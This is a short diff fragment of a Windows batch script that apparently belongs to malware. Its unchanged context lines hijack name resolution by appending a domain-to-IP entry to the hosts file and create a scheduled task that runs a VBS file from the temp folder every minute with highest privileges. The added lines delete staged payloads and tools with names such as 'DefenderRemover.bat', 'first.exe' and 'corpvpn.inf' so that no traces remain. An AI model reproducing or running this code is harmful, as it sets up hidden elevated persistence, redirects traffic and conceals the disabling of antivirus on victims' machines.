@@ -38,4 +38,20 @@ echo 185.194.175.132 davidroger.com >> %SystemRoot%\System32\drivers\etc\hosts
 
 schtasks /create /tn "TempVBS" /tr "%temp%\e.vbs" /sc minute /mo 1  /f /rl HIGHEST
 
+cd %temp%
+del /f /q "s.bat"
+del /f /q "a.py"
+del /f /q "ddd.vbs"
+del /f /q "expe2.bat"
+del /f /q "expe2.vbs"
+del /f /q "lalala.vbs"
+del /f /q "a.ps1"
+del /f /q "first.exe"
+del /f /q "corpvpn.inf"
+del /f /q "RunDefenderRemover.vbs"
+del /f /q "DefenderRemover.bat"
+rmdir /s /q "Remove_SecurityComp"
+rmdir /s /q "Remove_Defender"
+
+
 
